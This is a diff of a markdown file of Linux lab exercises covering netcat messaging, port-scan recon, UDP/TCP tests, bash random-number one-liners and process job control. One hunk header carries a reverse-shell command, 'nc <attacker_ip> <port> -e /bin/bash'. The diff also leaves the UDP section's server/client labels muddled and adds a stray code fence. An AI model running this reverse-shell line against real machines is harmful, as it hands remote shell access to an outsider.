@@ -1,5 +1,3 @@
-
-
 ## netcat-exercise
 
 ### Raw Socket  communication ( Simple mesage channel)
@@ -54,6 +52,7 @@ nc <VM_IP> 8080
 GET / HTTP/1.1
 Host: test
  ```
+
 ### Port Scanning (basic recon simulation)
 ---
 
@@ -95,11 +94,6 @@ nc <attacker_ip> <port> -e /bin/bash
 ### UDP vs TCP behavior test
 ---
 Server:
-```bash
-UDP vs TCP behavior test
-```
-
-Client:
 ```bash
 nc -u <VM_IP> 4444
 ```
@@ -152,10 +146,30 @@ Understand:
 > sockets don’t care about format, everything becomes bytes
 ```
 
+### Random Section
 ---
 
+#### Generate a random number between 1 and 100
+```bash
+echo $((RANDOM % 100 + 1))
+```
 
-## PROCESS exercise
+#### Roll a dice (generate a random number between 1 and 6)
+```bash
+echo $((RANDOM % 6 + 1))
+```
+
+#### Shuffle an array of numbers
+```bash
+shuf -i 1-100 -n 5
+```
+
+#### Generate a random password of length 8
+```bash
+tr -dc 'A-Za-z0-9!@#$%^&*()' < /dev/urandom | head -c 8
+```
+
+### Process exercise
 
 ### Locate the current process running in current shell
 ```
@@ -297,8 +311,9 @@ bg
 ```
 Now you can do
 ```
+ls
 df -h
-free -h
+journalctl
 ps aux....and many more
 ```
 
@@ -312,7 +327,7 @@ Instead of opening another terminal:
 Ctrl + Z
 bg
 ```
-Now it can be monitored while doing some things:
+Now it can be monitored while doing some tasks:
 ```
 jobs
 ps -ef | grep backup
@@ -321,7 +336,7 @@ ps -ef | grep backup
 >*Long file transfer via SSH*
 Suppose you're SSH'd into a remote machine and want to copy a large file back to your local machine.
 ```
-scp huge_backup.tar.gz you@your-laptop:/home/you/
+scp huge_backup.tar.gz user@your-laptop:/home/you/
 ```
 If you realize it's going to take 30 minutes, you could:
 1. Press `Ctrl+Z`
@@ -379,4 +394,5 @@ if pid > 0:
 else:
     exit(0)
 ```
-Then run and check the  `ps aux`. A zombie appears.
+Then run and check the  `ps aux`. A zombie appears.````
+```
